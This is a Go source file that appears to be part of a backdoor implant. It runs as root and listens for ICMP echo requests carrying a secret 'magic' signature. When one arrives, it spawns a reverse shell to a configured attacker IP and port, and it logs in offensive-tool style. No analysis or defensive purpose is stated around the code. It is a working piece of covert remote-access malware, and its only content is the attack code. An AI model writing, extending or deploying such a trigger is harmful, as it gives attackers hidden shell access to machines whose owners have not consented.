package main

import (
	"bytes"
	"fmt"
	"log"
	"os"
	"time"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// ICMPListener handles listening for ICMP packets
type ICMPListener struct {
	config *Config
	conn   *icmp.PacketConn
}

// NewICMPListener creates a new ICMP listener
func NewICMPListener(cfg *Config) (*ICMPListener, error) {
	// Listen for ICMP packets (requires root/admin privileges)
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return nil, fmt.Errorf("failed to create ICMP listener (needs root privileges): %w", err)
	}

	return &ICMPListener{
		config: cfg,
		conn:   conn,
	}, nil
}

// Listen starts listening for ICMP packets with the magic signature
func (l *ICMPListener) Listen() error {
	defer l.conn.Close()

	log.Println("[*] ICMP listener started, waiting for magic ping...")
	log.Printf("[*] Looking for signature: %q (%d bytes)\n", string(l.config.MagicSignature), len(l.config.MagicSignature))

	buf := make([]byte, 1500)

	for {
		n, peer, err := l.conn.ReadFrom(buf)
		if err != nil {
			log.Printf("[!] Error reading packet: %v\n", err)
			continue
		}

		// Parse ICMP message
		msg, err := icmp.ParseMessage(ipv4.ICMPTypeEcho.Protocol(), buf[:n])
		if err != nil {
			continue
		}

		// Only process Echo Request messages
		if msg.Type != ipv4.ICMPTypeEcho {
			continue
		}

		// Extract payload from Echo message
		echo, ok := msg.Body.(*icmp.Echo)
		if !ok {
			continue
		}

		// Check if payload contains our magic signature
		if bytes.Contains(echo.Data, l.config.MagicSignature) {
			log.Printf("[+] MAGIC PING DETECTED from %s!\n", peer)
			log.Printf("[+] Triggering reverse shell to %s:%d\n", l.config.AttackIP, l.config.AttackPort)

			// Spawn reverse shell in a goroutine so we can continue listening
			go func() {
				if err := StartReverseShell(l.config); err != nil {
					log.Printf("[!] Failed to start reverse shell: %v\n", err)
				}
			}()

			// Optional: Add a cooldown period to prevent multiple triggers
			time.Sleep(5 * time.Second)
		}
	}
}

// Close closes the ICMP listener
func (l *ICMPListener) Close() error {
	if l.conn != nil {
		return l.conn.Close()
	}
	return nil
}

// CheckPrivileges verifies if the program is running with sufficient privileges
func CheckPrivileges() error {
	if os.Geteuid() != 0 {
		return fmt.Errorf("this program requires root/administrator privileges to capture ICMP packets")
	}
	return nil
}
